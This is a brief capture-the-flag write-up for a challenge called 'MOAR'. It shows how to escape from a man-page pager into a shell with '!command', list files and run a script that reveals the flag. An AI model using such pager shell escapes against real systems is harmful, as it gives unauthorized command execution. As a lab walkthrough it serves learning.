# MOAR

´´´
nc moar.ctfcompetition.com 1337

>
NAME
       socat - Multipurpose relay (SOcket CAT)

SYNOPSIS
       socat [options] <address> <address>
       socat -V
       socat -h[h[h]] | -?[?[?]]
       filan
       procan

DESCRIPTION
       Socat  is  a  command  line based utility that establishes two bidirec-
       tional byte streams  and  transfers  data  between  them.  Because  the
       streams  can be constructed from a large set of different types of data
       sinks and sources (see address types),  and  because  lots  of  address
       options  may be applied to the streams, socat can be used for many dif-
       ferent purposes.

       Filan is a utility  that  prints  information  about  its  active  file
       descriptors  to  stdout.  It  has been written for debugging socat, but
       might be useful for other purposes too. Use the -h option to find  more

´´´

if you use ! + command, you can run this command on the konsole, so this is what we are going to do

´´´
!ls 
>
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr

!ls home

> moar

!ls home/moar

>disable_dmz.sh


!sh home/moar/disable_dmz.sh

>Disabling DMZ using password CTF{SOmething-CATastr0phic}
home/moar/disable_dmz.sh: 18: home/moar/disable_dmz.sh: cannot create /dev/dmz: Read-only file system

´´´
